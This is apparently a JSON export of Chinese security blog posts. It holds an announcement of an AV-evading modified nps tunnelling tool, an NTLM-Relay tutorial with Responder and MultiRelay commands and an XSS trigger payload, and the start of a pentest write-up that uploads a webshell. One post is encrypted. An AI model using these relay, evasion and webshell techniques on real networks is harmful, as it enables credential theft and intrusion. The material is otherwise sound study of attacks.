[{"id":"badd5d9a02640c51cb699c12c4298740","title":"关于nps工具的魔改","content":"免责声明🧐本工具仅面向 合法授权 的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。\n在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。\n如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。\n在安装并使用本工具前，请您务必审慎阅读、充分理解各条款内容，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。\n工具来源及其说明（1）nps通信流量比较稳定，但特征抓的比较死，所以基于原版的nps进行二次开发\n\n说明为了工具的免杀性及其后期修改，本人不公开源码。 本人承诺，工具无毒，只能简单进行二开\n魔改部分（1）重写了nps的认证过程，通信过程均进行加密\n（2）重些了npc的部分，预计后续分离config文件进行加载\n（3）进行了nps未授权漏洞的修复，避免了默认配置未授权\n（4）支持config文件从远端进行加载，在传输过程中均实现流量加密\n\n免杀情况（这是魔改后的demo上去的，还请各位测试切莫进行☁️测试、沙箱测试、联网测试）\n魔改后流量魔改后的工具流量就不进行抓取了，需要的话，大家可以自行进行测试。\n某社区☁️沙箱（demo版测试）\nvirustotal\nwindows defender（静态）\nwindows defender（动态）\n360、火绒等其他杀软未进行测试项目使用未进行测试nps服务端的注册，所以目前主要还是 .&#x2F;nps的方式来运行\n服务端使用客户端使用配置文件启动配置文件如下：\n[common]\nserver_addr&#x3D;127.0.0.1:8024\nconn_type&#x3D;tcp\nvkey&#x3D;123456\nauto_reconnection&#x3D;true\nmax_conn&#x3D;1000\nflow_limit&#x3D;1000\nrate_limit&#x3D;1000\nweb_username&#x3D;admin\nweb_password&#x3D;123\ncrypt&#x3D;true\ncompress&#x3D;true\n#pprof_addr&#x3D;0.0.0.0:9999\ndisconnect_timeout&#x3D;60\n\n\n命令行启动\n命令行以远端配置文件启动npc.exe -rconfig ServerConfig地址\neg.\nnpc.exe -rconfig 127.0.0.1:23123\n\n项目进度✅ 2023.5.19 重新写了通信认证协议\n✅ 2023.5.20 把连接流量进行混淆，仅仅支持客户端命令行启动，未支持conf文件启动\n✅ 2023.5.21 支持本地config文件加载\n✅ 2023.5.23 支持config文件仅从服务端拉取\n后续增加（1）实现其他协议流量的魔改\n参考https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps\n","slug":"关于nps工具的魔改","date":"2023-05-26T07:52:53.000Z","categories_index":"","tags_index":"工具魔改","author_index":"Q16G"},{"id":"a52b5fed34208f47aa981d461e5d2476","title":"Golang多线程并发学习","content":"\n  0dd1614d5a3acbf1b54e788445f78270283dbda5bd7ca181b19a39e0d28701710162214e56d6118202539714191da8f238ebec265bf1d3aafa43ee2607242b6c74a547fa28d5cae39ee0813353266529b1c37270cfd82355e2d9025063319b8a38cbc2e7e439b562a049d7271e03d0ecfbb4340c403e69b563151c9da424935caa77dbf245bb45df8b0a9b56d8f69188f2167ac0c2a02e6815bbd54299c88d86a99509b10360b4aba5136f8a4b9950ae700f1e1d1ef990c296207de92eaf45f15b777f39b14904592eb207bd232963ce6892b33ea11e4f29e5e27376f30ddbd56ea5b19b9f9c2b43789f851306063463a1ad6a7d8541eedb64de7e7475cc1177c18f7634f31daf8ee6a0ea58ae9be192e508832d11efa061d6d1769c60cb61bc6e442d91926d33cf817d7f1a6fa694e9d187729a15394b85e34cdbd16cb6e7dbeaa98f6663f2dcbfba5544ba4ed07a9a8100dd03ddd70e5e821e7f78c704cb866bd682116e5d13859c47f8664534c7acf62a2a8b8748cc9e39e3a08451faa514c463211c080479eb056596498fbd6704db98d61c16175bca2e9693e2c997083640740ccd6abd29fe37a7a695ef8bc13873fe18a4c49ce13c14ec4c3c875e7fcfb8ea67983f442991fa91b5900b8e8c83c201204fbe3be253cfbaa127d34e3c929832bfe71fef140291f7b0aea32bac29e343b30678ec2f11b0bc39850cf7485d30cf8a1c487bd49269bc56e4c604c93bb49183119e59d2f632c2766a6162e8505f3af099a1b58b2b48f87daa8819c2f4bed36e8d1e7d6e12942b67785d76586a6af498aac1a1a7da90aa5c99a918f408ae3bf8cd40550bf8023c17285e1d6d22b45654cff865cbd97881d522cd4c36d04ce08f96709cb0073d4eab9921686b10df3403481f1e8f07131373645f82e8163d4d10fb031e73cddff37937ca5821195c10cb2f5aafb53d3d3f9fb98a9401986b129aac7cfe88b568a45812ed29b39691140589907730730cf77b86fd3a051886713beb1ab59f40280d84d0d3d70ac2e1a9fe6e3d2c5b64d5e4d8fc4460fc7a4b3a1bf076176d544ba7cd42f55c8fce524447cdda223804a1c2f5cda1d4cad72bf6be71731b3b5a4a955eda2136fa3f71e0f691a721dd6326c95e28ad26a5ad6e67da2f44124e03f83ed7a4d1ac01f24e4b41663262003417de5cc3e3279b89f46049b86e150706d13d2fc8cd0d696d3460fb341150c4a2bb98b759d291ce80d69595fdaaf4bf9cdddd6a506acef9f9254f06034ef4c901515f2f364ff18b72734929befa1c51616f23886509d80a4093f4999aa8b052a5521a0298a7298b6f73eb75f0b9b3385a9d74f7b2a785c246a9f2705eb9ab36805f135285ffd41a04a1ab0fe87194fc188e5c2be2abdb93a8fd84906b13aa722519f4c8572a97a10f149c457195940364c74b9fc499ffb02203a981170eaf5923ca4ab24122d17b1cd670fdf281c4e7ffa9fcc62a5fdaa4c285d8bc73d9aa6be2f91588180a618f0511d8e2f09d3646eede3b8c1ee2332976dea28055008e46cc5cc076595a6a48d759cecd00ee278d10cb8a5b4378716d840670367daffa8061b35660cd9d3afb9909a2d15616cfff22d3716890fea3967a91345c3fa6f10c4e4ce80e75c3c3370ef719c285a30336faa3ef4ab98470d1bba30935dcd28a9293965e41c12fd6b92e87a9b295ea4f3f0898405b65b596c717a86a29454f42a9a6669588c28bf97835cb4b398f69617d7750474055d6c1f7b80bb26b67b035a255f8a5fd71f36921532aaa87943ec35dddc8ce23d40e268d0d1a5ab647285607523a8b3595cf0b0a747de7011be85b5d4e5a813ef1845edd1023a29df9db032530acabf98725e478e49995203b43782f4bf75a112ec7b551489838aab8bf69e48bb46ec7c43e5c84b541759449f64b48c39242f62c35dd0ea4210b2a4b7c52c24d1e14aa7437b3bf656b7713857be10a33abe418809fa27cabba32a848d42651992505d764b3f6768cc082b3490011dff071be4a66231ce33529022cd925214a9c7dc32370852c41b8d025ca7a869fb25c5f3b1cb58dc7f78933dea9b87be3f48d6b61f31a57fb40b5cad95e836b097836f2a1a3b3ac92cb43aafe25653e4bc9a87ae7911eea58931400438ceedd6b9e02dd50430979d498457cd7efb7b7d7d3c805687500c708ec4db445358512aba76e16f98e51d249db4c1f3263889b229f3d344dc86a59798f7e85fb40053877b8a6a6991f7230a8ec083f588fb305905f8091546492dad8aada8baf986e2f18830a16a58a27f0973892dfbe9643be17d4423961fc92d16dbdd4f010bbe39e1ef26607d4ca36c2ef3298cfde85ebf598a3e0eb010efcb28a2eac2e4f4871e21f8b23850f64932e49312b6cd3d785edf08e87e03d7fb2ba6641a2d0b7d5545902d7bff84a8f7418b4cfd272205e757fed937c4f954d7aab15d4b28e8d6309f3e676ab9252c9dec9decfd398e272653c1c28147da7388898c504355f9a235278dda652954766387774345d26583cbef24d8e191ff9b29480aaa2a1bdd7c0b8d61e6cf6a3c861792eea477f21fcc76436104acfcdf83a64ed1990791a0087fa82e27d2e431ecc8040499fc63d89f141200d8d7dc86033f421654bd3403c3dec44a59446120bfa673dd65f67cbc057e1f293135a75cd4e2a3b0ec95293a75ed6baaa43c73307fdf10f3936abbceb02997778afa9a99495cc9a89086def4ae13f4e7e9551ef5b583c72ae560566e8f8ad25f2a061bc1159edaf23bb27050d27e8c33131f0c114dc15a8cbba0f87b0df6bac1e8eb82e45660161219bc0a50eb6c6cb5c05a0d7e33de7236bfb67cf8d0d82e3851d9242050d4145d8f05c726de746993f6a921eab41a712778cb1e4fa0df4c77f71b5b11915322db67d5b5133d548bd1dc1ed158308ef2d42781b618e1b10d6908cbb9e0c8912bb1a48b3db78337c8d59fe501a0f226cba40c0185a51734dce5903e636196e2952db06a427fcdeec4ceececa18bcdbef347c04ac24f2a238de0aba94ef2ca0a94b2408f31e57652b24bb658ec66c006d3c2aa1a75dbd31f39d3071bf5e608fb87ac56ba4ec9acba0548c96b81f809fd4b3a22fbf46f585ad1e6e7b266a34a037b31ee74b2bf9d2c73268086a307f4ad55dec2aef1b6a93e4a79069bd46caccd57b330674ae453501721918d322d53b227bc0c32f7a0817d6e180032d9162d515b29dcbbf35223b83a1800186ade7ecff3873c7f795bef7b8f4fa3ef98f368612f3820968e8b4d6da7c657fee190421a2eb767cf57fa373754af7930e1971fd9e28c133097e5aac7b067459ddb359b45a23c9a3c29834094dc810c395115eeec572b6c62a9fdea60f3a314d2319ba4fdb9585ef6c9c819ea5d48b0389c8d25c4a111f118bff76dd7837ad7f10757a77b40b0592068c34ac2566de49b08f1af11f95228c56e4438b45bee6da862a765a1a6edaced06955e810ce2d43165a1774a1ae878b6da3ebca9894f0b222f885175a25529f63a5e6bac25c30739fcaf1ff2ea6bec74f355904c00cbf2444cdf79ff499589742b21fb6f44edeade8d5eebc89b55e843f3bd1d94d53c371e713a0d41264b7d3a7c7c37e3ca9435cd632d66e4ce79308c48266cefbf337da78f21158e94733e5b3c7eca58918ea5aabc349ecafb52b9e53d9dd1b1ec82836410a780b9370372f79cf09856337c49e38e8d99defdd43a2f167aa1f5c302e06ef0d2f53a6d259dca540b8130fa6c6215a04d630d1a37301177a500c5ed9d57a42cccc7fbb9d9675dfd037c677c956e0855686ba93094e5515915901e9ba037e9c88e95b1148b0fc4d7bd880f43711f32284dd7c55460634e243e37319fc236fa49370b5cdb5ff1cad237d277656900cf988a55e86683de5824cad80ec17d7bc7a8f4c131d534452522bf56aec18c023d85c7ce47f92e548426a2e72408ca46399836729a8924efeec6591440fa3bd2a69987b33e81e7f0daa2eece88ea23d7793b5aa473bb0ba459fb522ebe88854dd55d29a0b22a46146e25a08a4c3a4b51d991e9d0973ec0c510283bf595f1ed7808f3ec8110549741e18ca3ebcf53c5177044c4850bb978d189b2419869244637cf5c7ddbb15a204dbea9ada171cc4ddbb3702c4900665ca8af14a71745cdad2d393bbc30a63f2f091e906a7d66c6aae6c45429f0a9e244aa9c11c25d9fc10aade0ed08b59ec91d137ac849fd545ddd9ea13f67edc7668bef747f98a290b6a6ddacf6bad0ae7cbbe1d6c5b683a75de281b3cf111d129835d07a088de57a726de551a08f0d7f08d5903e68faa56babe77e74c2999abce85386acab119d69067063fa98a86675567d6418357f0034c0b08a74940e1dc2a5868ff94cae33f391881d6b5d70d5c514a10dc8a58aa59419cfeaf02dcb4d1a4b6161ba7847cc7456b7965a2a88abfd23fd7308c2c4827a56892b027d6c00e1f8908545f14eeb103373aa80391c36999d1d3701c736cd01d600397b7d56ff8a762b6f1da0566886a9eb8373c33bcc772257623dc62e13b00d419720d481673832c7900dd7d773f73e5b6ff2e928344b5efb168e052fd312946c04e2268dad201964a5618c0657887b5df961b9bad56656b9b9c71f6f0619baaf061824d156374bde1c27e5e187211e5dbeb774122c888ee224685a896cef5d3ac746d44e48e0fc62ddb279f3a71221fd5e56541da373b25f55cd6e68f4fc4c14a65379397851b41091345f344dfa8771edbe91c5090a78d65b2e65709ad2a7937d4079b940f23936c7abb43dfcfc8c5fc880e168b605f5b37e2c1cc484b6b84a08fbe5cfc3b008504c17bda85d0f1482548add9a215a18bde7bcb339da87b1b8cbade78de8f21006648f58d8f810b5dfb81c10d10d6558df1b53116aa7e3a5c3a29de2fc754956c82d542b21b8b902d35b075b06ccb19a9b2de0cb7deb9b1a6b42d4ccccbdcd982430a98fb8998e5002992bb07b9738aaa2d468283bd5799c7df89ff04cf4450dc800b69bcb97adcfb2419fa8e3b0eabe1a7073cd568febea721b0f1a25aeed86eefb1a2deb093345a28496c36a26c93204a846a702ff3bf0d573d2c002beec1ea0719248a1209f45bec359d6c57c8ebb00e471c1e786b98d9750291031e2a5cfc3d61b8d67daa25cc667e68cc001bf258fe6f521c3bd06125fb91b4c80072e61da616846d9ed174ae42f61b4b4a36cb0cf500789cd08a86a528a336d1eb8ecff9b01d95b7fa9ed88275fa780e2c0887747660a96138c09086a380db323b939501040ca9a68de893b081a3020e45f7c6c908b2d2753a9a83a7ab782be5554891dddbf928743291523e794f3056b827bc43118fe3ba9f738a4f1c7812ca9406ceadfb3e60aa9c9c2cf8814d11a76ed82191095b358921199de39d2be698a048a7a45464d8c7057dce02d12467fdea8149215822762be3da72c1d80c7d8414585ac5801b3453b71e8c93c8e942a2fa08d89198087fe1f4f7f75b9382246c49b126dd8834353d54b90f26fa1554e25e954347925c5867734ba5f6d5b2a5043b8129df7258615ed0efbc0fbd21a0094e8ecce07ccaeb34b813bfc5eaa0282cb23299887e5fd24b3a35c84fb5de2346b8d5140d95c8ed9e1a9e72231600b11714a48220b4b073fd5d428940b4bc2d5e127de3d4bfe768adc1e4c5bdaaf2ab8cc02ea7d27624b22fd5ce786b190cbfc5d518acc79b415db4fdd8b7759dddf7efd35eeda3e79bf03f99f1d5bdc5200d0ec5f33593f89a3ab19a80c7fa9e883ef3cd706321a0ff4be33a40632bf8dbeb3403753eeb5c4bfcf128b62769e16a4c25144648118a093bb5962338355fe940f7710c270d8bed33bf22cbaa966bb6641b43672020bee73c4d53bfc88194415a352c267f21bf3c845ecff8e6847ebf5aa2dea1686070de432320c9e177188a00339d169072f0d23332f2902c0942297babc2b3a11e3213f9ed86d3b56d9a6d520cd80e29646f5c35d61a32cf387c9d2ec1c2392271cffb491d254744dcaa556f147c2b0ff454441a4440d4877296b0156d6cad3ec7db3211d72dad80ba1ac8e8013c402c17873c76573262895ac8e9d0b1c043e5ae466d83265edd199b582f7d175c845b492a85a14bec9dc83d11b33c124efe0607e6df20be16d2d00b07a78b089a8d52c23ac39d4304b881ecf1dcaa44c9ed32b5638dc9e35b1b679545ecad5983112289199fa4dcaa0450c55fc4912ccece80c2b079c925cc8660fc45efe6bd1a2c3ecbf93130b1a0ffd89be8ee61ee95093d1de6abf9e8afda2fe7c39a81138212a5de9dc174e85aa5e5b499b050550292ad3224b779dfee7c8f27ab6aa1b1ae821cf7b578e79057ba211a39d0923823590d87922bb3c34437e741cfafed61d19110b4b31d77808b69a4eacfae78e8a62cdb1ba672a1067b903e2b6e209b2d9b7447c80c06484ccc0adbf402fa5350d48f5f6a53ad40240355b477d0dc103a14a8a192d563939e723499fb8a394cb530b3bf933a607014a985cc190c56226dc930fa253a0aa632f20025b05e66f73ce5aeda8ad086a1939a6f0d181584ef2ea0f9e68bae660b146fc4c5de23b9f5f725025970b3189fade098864d7fa15f23423e211383ef9477b89a25a07e8faa464ad6ab06b827d1b443e990ee48953811d127a52a454e6c94a35d2796f53bae205c8cedd9540a1e615120b47b969c1f876124e78ab9607df35309c7cab07a901a31297d0e2bded460511363410f298dc3fc5a04a343702b4b060caf90e09b3fcc60c7327c0886cc6e990b6a32865c797ce330b7c65ba1727ae236727f1c79e90f1b76c40f7b9f61c43bb19ec73dd3049b6f12b94416173ebcbdc0567d59c85d2f399ba38dc664dbcc4e485114474e6fcf7d911512a3a133122372518f43860fbb2ccbc56015590f7bc520441ba10a016c50f0c51a31a06380d25293a5a1d3e0c697a7a901c78bad1e4fd8151571d5c2946cac0a125955a382290349753a44f0250d1076045d26c5299661952f0fec4a86bb295371ea6233fc496f935d37e79dd27cbbee662a04c6340d6a48b415d809016c70da95b61f3e1b84c8dcae90cb323f2ea350b2709ddceb1fbc608ab967569bdabbcd5790427bfe1a7854df0d23bcc198727efad9dfbf8a4f01c980e2b121121b966ec1f742729e07c280c60f952ade9b44f16a834ed9dea5e4712242d9c5cf16b604a9254e667d6d7ac76e98421cb213b52616cb77476b4369811b2d9a5c2c99b4459d95a01e43e0b4f2141548a2752c7ba4b055498701d5bc655bfd3dd037cf9d9a2a27307f3b25fb6e9e43126efdfaced5bb2cdec401e6529ffff5b96905e3343afa3a35a27047f1ab1880ab3601ed21607a0a27215b786736da729b4becbf71d197abd54998292cd7bd5ac33ff384b7b4c2d624c13475622e4007df152568f4af3ce2fcbf3bb3bc67d5b1b41a7a37a3da991eceacc96b25b283f163990dd9fe5f3c3ff7ea39548fc645151edd4cea00cf114b45b096cfc416dda1c2781a6b9c488b1118391a372de590ee36207596bccb00c840f08ff07ec0dd116e1fd5bf888180db447240e8287e97ccb6ad246b78f694d70daa5dfe27f25f8584fcc2d52c28b1618582de752b18355b565db57d434b52cddfa2632a906464ab8123add38b291cb630e4f027c58b54c00c527c16dda3c96e0ff5177fe2537c9c9b13c097c5273324ba26a300d3aaa23ccdd67d04a5f03805f2e14553a23025bc5a29f4dce445b9c63c14708e69875cb272accc5e445b134559c78167394e8badf5d57b4a42564771987d2da0354ea28b338826dbcefa0b136a916587c5fe97a0154878777ec7c9b3b2e1a36908ab143293f516344514d9a0bcc01fa046b7d907f880a6cade5d2de48a575d87d8f2670dc0cf8a00ebe3643c5c790c41fe9f8bb7ce8402fb97f2309aeda0b4549b1950299e114c92d94ffe35f8e119b05581100289544859f3ea23e085a054fe54c00f9903c9ba23a4ea324ae7aadadb9566dbc312dac5fa4dc382c4bacb8fa1860c11d121ba4f417428007263fa77b8008a39b4dc7e2b5077308862faa3a0a6fea99d11dc8d52d73c503e82efc9644c701e2f500e5f1def993b63addbbc6bfdf8feac91b736e23fcf13a893e302be28923b3b086b7ee7c081da8c9b15e311527b07d79576bd6b92e3bc7b5b35fb43921c328ed86f2968d119efe9f2716fabda5706e7f8d5b05646686f0f33d3b271ad2086c8263a583a5e9099330c63e098e5bbae7b96fe5671f11655e34f33c47376f8025e94d431a8b34bc066985097d8d85af03449f26ceafc2126d68571f59d2fdcbee9ee169cf0d9f1afaf80a758be6afacfcd0e3b835fa48383f0fd41863b9b0b36efb12da811138b4dee9e410779e33a213635cb0ba474a10989e36e1ecf555e5eb9d077fa401c0fa3c64004cd3de8f20435ac60304e5327e21570918388420538cce9b19e909130aadb34e6644838874b8e55fb02aac47f0a2dcf909b34cc6fe8545098e532eb60f1bde3bb3d4de989cb747bc3e48b48802c6aca43e6c400c84619199051bd5fd258034fa7fcd8ae9d294e5226b8ccf2a601d79532e525b5d280522c823e9b0a88b328f6d3f761992c6ba6da3b27468f0382d59e956283824d787a0f81ad7122c7bcc976683b6bfe2685c4585a25b4c4c92eecc185b5cdb5c89d3be69f94c204768d0ca4d4c12fb7155dca57a92863989980f8649f19d2b14a18849e6720804e92b8e8eac90c1812ce94de40eb124729fa5e40c7d3faf59679984ac5462a9bc0b365f1596bc3c15cebd4afdaf77ea41e4196fd582cf26b961a29613ed4a0804fc05157fca6750db77ca25818a0bcfe03c69e0af5c122171f1def6fe5660406ac71ecb625902a53ce1a2582fdcba4a9f6775ae04f92775a0be00a86de1cdbf636c4eb9965673946fed8083d0bfde6d72c4b75b64dba2877da1ad99c69e400b3c7ef75a33895503fbef49c1bb04ac99d37c645ad9dd7179cff6b2be2074fc5dc70088f344b8f003a0c01c3ab2662a1fe4d5f4f6ef9c5fc52ab7999bfa13f5d400496bd5aad5f0f89039b33373802b3e3f3652d05a13b14279f3bf76215c301dbd5a3a66752f5f49224c1f62b4c8ee2849d8078cfe1cd06b98369d32982f598a1b8f8e6a2584e8425bce1d4cd3b33b1a3191d1c598d215c59072c61f4456d6a38c5a17cdf4e882c77e5e9eb35012137bf4ca01eae536e9107555ce33b06595d8e8da4b65c3568e05557f8359101574033400f024a39edbecb990bf7552a252825e04c6e3f979890d0e5c9098ed9812fdafbb89c9ed508c1047484990b46b4e7edd7b7d787740eed1f91c4ecee296651b791b1442e5fd1d564942e3002dac3432a09683f7f4dcc2f68d4d070ac841d55edb45fc3b029a7f7715cd6881530039484f4a0f2bb5d3c4207a545d1763ccab598f1d0d73b7249795f614a8364c3139cc8fba8f03861bc8b8c7c001650cf3431f014af53fb29774d5b764c54bed2e20c7828711280502f66f62820dcdd58f1bac42c4e3f48ee0481fa2b3b50677d4a1d186fb67917b6c149afd4ea1f04e2efcc87356c6679c323d77d82db2bd9f27e89be850eb35e07259fc679b110e9039e19e5d9ad8e57f5f45ace83b56d82e39aa23659499a16e20775f314efd2a6289c754ee03fab55e48be1f8417880e51e8da987674b47429ba2f24f05ec01b06edd69b5a72dcbc143b1ba646e77ca579e8ab23c321b32853e0b559967379bcdb7a4a48e9979c72fd0fcb06248bfaa1b519d8cd42cd75ace830c2bc6798a4f7bd91a2dd6e34160228c816d1d0afeab83eacb1382daa9bcfc797650\n  \n    \n      \n      \n        请输入密码查看\n      \n    \n  \n\n","slug":"Golang多线程并发请求","date":"2023-05-25T12:44:51.000Z","categories_index":"","tags_index":"开发","author_index":"Q16G"},{"id":"87b274fadad0a6b05fd4814550be9f11","title":"NTLM-Relay攻击","content":"前言介绍 NTLM认证分为本地认证和网络认证，当我们开机登陆用户账号的时候，就需要将lsass中的密码转换为明文hash与sam文件中进行对比，这种方式就是本地认证。\n而当我们访问局域网中的一台主机的SMB共享的时候，需要提供凭证才能进行访问，这个过程就是网络认证。\nNTLM协议介绍NTLM协议分为几个部分。 协商、挑战、认证。也叫做挑战响应机制。\n协商：这个是为了解决历史遗留问题，为了向下兼容设计，双方协定一下传输的版本号等各种信息，版本主要分为V1和V2两个版本。\n挑战：如下图。\n认证：对质问结果的验证，验证通过后即可访问资源。\n\n\n工作组中进行挑战过程：（Netlogon协议）（1）客户端向服务器发出登陆请求。\t\n（2）服务器返回一个challenge，包含一个随机数和一个称为realm的字符串。\n（3）客户端使用账号密码和challenge计算出一个respose，然后发送给服务器。\n（4）服务器使用账号密码计算出来一个expected-respose。\n（5）服务器将生成的expected-respose和repose进行对比，如果一致则认证通过。\n\n\n域环境挑战全过程：1.由于域机器中的SAM文件中，不存在域内用户的hash值，所以域内机器将客户端的username、challenge、repose通过netlogon协议交到域控手中，让域控进行身份认证。\n2.域控通过客户端用户名在自己的ntds.dit中进行寻找，用challenge进行加密，再和net-ntlm-hash进行对比，返回结果给域机器\n3.服务器根据DC的结果成功与否返回给客户端\n\n\n\n本地抓包测试这里起了两个windows虚拟机，这里左侧已经连接上去，这里wireshark看下流量包\n\n这里wireshark抓到smb2的数据包\n\n这里可以看到172.16.165.130是相当于登陆机器，由于是非域内环境，所以只能按照本地网络认证的过程来执行，这里会先进行协商，确定版本号，然后进行challenge。\n\n这里服务端会向客户端返回16位的随机数challenge。\n\n然后客户端向要登陆的主机发送用户名对应的NTLMHASH对challenge进行加密得到的Respose。\n\n将获取到的Respose进行Net-NTLMhash格式的拼接。\nNET-NTLMhash格式：\n username:domain:challenge:HMAC-MD5:blob\n \n详细说明一下各个数据的获取：\nusername和domain都可以从下图过程中进行获\nHMAC-MD5为NTProofStr部分（正在username和domain获取中得到）\nblob就是Response中除NTProofStr剩下的部分\n\nusername、domain的获取\n所以当你拼接完成之后，就可以用hashcat来进行解密完成密码的获取。\nNTLM-Relay前置知识windows系统名称的解析顺序当我们访问一个共享时， net use \\aa 其寻找这个主机名会按顺序来进行查找。\n（1）本地的host文件\n（2）DNS的缓存\\DNS服务器\n（3）链路本地多播和NetBios名称服务\n\n如果在1、2中没有找到，系统就会通过链路本地多播名称解析和NetBios名称服务在本地名称解析。这个时候，客户端就会将未经过认证的UDP广播到网络中，询问他是否是本地系统的服务，由于改过程未经过认证，并未广播到整个网络中，从而允许网络上的任何机器响应并声称是这台机器。\n因为当用户输入的不存在、包含错误或者DNS中没有主机名的时候，通过responder工具监听链路本地多播名称解析和Net-BIOS广播，就可以伪装目标机器，从而让受害者交凭证。\nresponder攻击详解Responder工具是一款用于中间人攻击的工具，他可以用于监听本地网络并获取许多凭证，例如NTLM和kerberos凭证。\n--version             显示程序版本并退出\n-h, --help            显示帮助信息并退出\n-A, --analyze         分析模式。此选项允许您查看NBT-NS、BROWSER、LLMNR请求，而无需响应。\n-I eth0, --interface&#x3D;eth0\n要使用的网络接口，可以使用“ALL”作为通配符来表示所有接口\n-i 10.0.0.21, --ip&#x3D;10.0.0.21\n要使用的本地IP（仅适用于OSX）\n-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6&#x3D;2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed\n使用与Responder的IPv6地址不同的另一个IPv6地址扰乱所有请求。\n-e 10.0.0.22, --externalip&#x3D;10.0.0.22\n使用与Responder的IP地址不同的另一个IP地址扰乱所有请求。\n-b, --basic           返回基本的HTTP身份验证。默认值：NTLM\n-d, --DHCP            启用对DHCP广播请求的答复。此选项将在DHCP响应中注入WPAD服务器。默认值：False\n-D, --DHCP-DNS        此选项将在DHCP响应中注入DNS服务器，否则将添加WPAD服务器。默认值：False\n-w, --wpad            启动WPAD恶意代理服务器。默认值为False\n-u UPSTREAM_PROXY, --upstream-proxy&#x3D;UPSTREAM_PROXY\nWPAD代理的上游HTTP代理用于发出请求（格式：host:port）\n-F, --ForceWpadAuth   强制进行wpad.dat文件检索的NTLM&#x2F;Basic身份验证。这可能会导致登录提示。默认值：False\n-P, --ProxyAuth       强制NTLM（透明）&#x2F; Basic（提示）身份验证进行代理。不需要启用WPAD。此选项非常有效。默认值：False\n--lm                  强制Windows XP&#x2F;2003及更早版本使用LM哈希降级。默认值：False\n--disable-ess         强制ESS降级。默认值：False\n-v, --verbose         增加详细程度。\n\nNTLM-Relay攻击\n最重要的意思，攻击者利用网络监听或者其他方式盗取认证凭据，之后再重新把他发送给server。\n实战操作这里下载responder，输入命令\npython3 responder -I etho -f \n\n受害机器执行操作\n\n\n成功收到ntlm的hash值，但是这个是比较鸡肋的，当我们破解不出来密码的时候就显得没有作用。\n另类的NTLM-Repay但是我们可以将凭证中继到其他主机上去，如果在域内的权限足够大，则可以中继到其他主机上去，获取其他主机权限，但是不能relay到真实的主机上去。但是也有一定的前提条件，就是目标主机不能开启smb签名。一般在域内，域控默认打开smb签名，但是域内的机器是不打开smb签名的。\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters&quot;requiresecuritysignature&quot;&#x3D;dword:00000000\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Lanmanworkstation\\Parameters&quot;requiresecuritysignature&quot;&#x3D;dword:00000000\n\n（1）使用脚本进行探测Runfinger脚本探测主机：\n使用responder&#x2F;tools文件夹下的有一款工具叫做RunFinder工具，这里用它来进行内网探测哪台主机可以使用NTLM-Relay攻击，但是这里的runfinger只能在域内进行使用，由于环境限制，我就再进行探测。\n注意事项：\n即使有一个主机，你知道可以进行攻击，但是没有被runfinger显示出来，也不可以进行攻击。\n\n（2）修改responder的配置文件responder.conf，不让其对hash进行抓取。将SMB和HTTP的ON改为Off：\nvim &#x2F;usr&#x2F;share&#x2F;responder&#x2F;Responder.conf\n\n（3）开启responder的监听\nresponder -I eth0 -v\n\n（4）启动MultiRelay.py\ncd &#x2F;usr&#x2F;share&#x2F;responder&#x2F;tools\npython3 MultiRelay.py -t  要攻击的域内目标  -u ALL\npython3 MultiRelay.py -t 192.168.52.171 -u ALL\n\n\n\n\nntlm-relay的触发方式只有域中其他用户访问了一个错误的主机，那么我们作为攻击者就可以触发可以进行NTLM-relay攻击。\n通过http协议触发\n通过SMB协议触发net use \\\\错误的名称\n\n\n收集到的奇怪的触发方式通过xss来进行触发\n&lt;script src&#x3D;\\\\aa&gt;&lt;&#x2F;script&gt;\n\n","slug":"NTLM-Relay攻击","date":"2023-05-24T04:12:28.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"6926437034a0cc884741b3438fbe3704","title":"关于某次授权的大型内网渗透测试","content":"接到朋友邀请，要对一个站点进行全面渗透，内网发现多DC主机，遂记录。\n背景：接到朋友邀请，要进行一个授权站点的渗透，但是进去实际环境才发现是多域控主机。也学习了很多后渗透手法，比较受益匪浅。\n前期渗透：打点：（任意文件上传）直接发现头像处任意文件上传，这里直接上传冰蝎即可。\n\n\ntasklist查看杀软System Idle Process              0 N/A                                         \nSystem                           4 N/A                                         \nsmss.exe                       240 N/A                                         \ncsrss.exe                      376 N/A                                         \nwininit.exe                    436 N/A                                         \nservices.exe                   524 N/A                                         \nlsass.exe                      532 Kdc, KeyIso, Netlogon, NTDS, SamSs          \nsvchost.exe                    672 BrokerInfrastructure, DcomLaunch, LSM,      \n                                   PlugPlay, Power, SystemEventsBroker         \nsvchost.exe                    716 RpcEptMapper, RpcSs                         \nWRSA.exe                       820 WRSVC                                       \nsvchost.exe                    276 Dhcp, EventLog, lmhosts, Wcmsvc             \nsvchost.exe                    320 Appinfo, BITS, CertPropSvc, gpsvc, IAS,     \n                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    \n                                   Schedule, seclogon, SENS, SessionEnv,       \n                                   ShellHWDetection, Themes, Winmgmt           \nsvchost.exe                    516 EventSystem, FontCache, netprofm, nsi,      \n                                   W32Time, WinHttpAutoProxySvc                \nsvchost.exe                    932 CryptSvc, Dnscache, LanmanWorkstation,      \n                                   NlaSvc, WinRM                               \nsvchost.exe                   1100 BFE, DPS, MpsSvc                            \nspoolsv.exe                   1508 Spooler                                     \nMicrosoft.ActiveDirectory     1540 ADWS                                        \nOfficeClickToRun.exe          1792 ClickToRunSvc                               \nsvchost.exe                   1844 ddpvssvc                                    \ndfsrs.exe                     1892 DFSR                                        \nsvchost.exe                   1908 DHCPServer                                  \nsvchost.exe                   1936 DiagTrack                                   \ndns.exe                       1980 DNS                                         \nfmaonsite.exe                 2024 FMAuditOnsite                               \nismserv.exe                   1340 IsmServ                                     \nMicrosoft.BDD.MonitorServ     1432 MDT_Monitor                                 